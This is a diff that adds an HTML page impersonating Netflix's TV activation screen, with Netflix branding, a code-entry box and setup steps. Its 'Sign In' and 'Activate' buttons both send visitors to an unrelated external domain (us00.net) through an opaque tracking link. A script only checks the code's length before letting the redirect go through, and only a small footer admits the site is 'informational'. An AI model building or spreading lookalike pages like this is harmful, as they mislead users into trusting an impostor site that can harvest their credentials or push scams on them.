@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix.com/tv2 - Enter Your Code | Activate Your TV</title>
+    <meta name="description" content="Visit netflix.com/tv2 to enter your activation code and connect your TV to your Netflix account.">
+    <style>
+        body { margin:0; font-family: Arial, Helvetica, sans-serif; background:#000; color:#fff; line-height:1.6; }
+        header { background:#111; padding:20px 40px; display:flex; justify-content:space-between; align-items:center; }
+        .logo { color:#e50914; font-size:28px; font-weight:bold; }
+        .btn { background:#e50914; color:#fff; padding:12px 20px; border:none; cursor:pointer; border-radius:4px; font-weight:bold; text-decoration:none; display:inline-block; transition:0.3s ease; }
+        .btn:hover { background:#b20710; }
+        .hero { text-align:center; padding:80px 20px; background:linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)); }
+        .hero h1 { font-size:48px; margin-bottom:20px; }
+        .hero p { font-size:20px; margin-bottom:30px; max-width:800px; margin-left:auto; margin-right:auto; }
+        .code-box { background:#222; padding:30px; max-width:450px; margin:0 auto; border-radius:8px; }
+        .code-box input { width:100%; padding:14px; font-size:18px; margin-bottom:15px; border-radius:4px; border:none; }
+        section { padding:60px 20px; }
+        .section-dark { background:#111; }
+        h2 { font-size:32px; margin-bottom:30px; text-align:center; }
+        .content { max-width:900px; margin:0 auto; font-size:18px; }
+        footer { background:#000; text-align:center; padding:30px; font-size:14px; color:#777; }
+        @media (max-width:768px){ .hero h1{font-size:32px;} .hero p{font-size:16px;} }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo">NETFLIX</div>
+    <!-- SIGN IN BUTTON WITH LINK -->
+    <a href="https://us00.net/?S7es9fr0BB8cYXnzDUgzR30XHjZeTScziL4Gq2yBOrBj0Ln" class="btn">Sign In</a>
+</header>
+
+<section class="hero">
+    <h1>Activate Your TV at netflix.com/tv2</h1>
+    <p>Enter the activation code shown on your TV screen to connect your device and start streaming instantly.</p>
+
+    <div class="code-box">
+        <input type="text" id="activationCode" placeholder="Enter Activation Code">
+        <!-- ACTIVATE BUTTON WITH LINK -->
+        <a href="https://us00.net/?S7es9fr0BB8cYXnzDUgzR30XHjZeTScziL4Gq2yBOrBj0Ln" class="btn" style="width:100%; text-align:center;" onclick="return validateAndRedirect()">Activate</a>
+        <p id="message" style="margin-top:15px;"></p>
+    </div>
+</section>
+
+<section class="section-dark">
+    <h2>How to Activate Netflix on Your TV</h2>
+    <div class="content">
+        <p><strong>Step 1:</strong> Open the Netflix app on your Smart TV.</p>
+        <p><strong>Step 2:</strong> Choose Sign In and get the activation code.</p>
+        <p><strong>Step 3:</strong> Visit netflix.com/tv2 on your browser.</p>
+        <p><strong>Step 4:</strong> Enter your code and click Activate.</p>
+    </div>
+</section>
+
+<footer>
+    © 2026 Netflix TV Activation Guide (Informational Website)
+</footer>
+
+<script>
+function validateAndRedirect() {
+    var code = document.getElementById('activationCode').value.trim();
+    var message = document.getElementById('message');
+
+    if(code === '') {
+        message.style.color = 'orange';
+        message.innerHTML = 'Please enter your activation code.';
+        return false;
+    }
+
+    if(code.length < 4) {
+        message.style.color = 'orange';
+        message.innerHTML = 'Invalid activation code.';
+        return false;
+    }
+
+    return true; // allow redirect to link
+}
+</script>
+
+</body>
+</html>
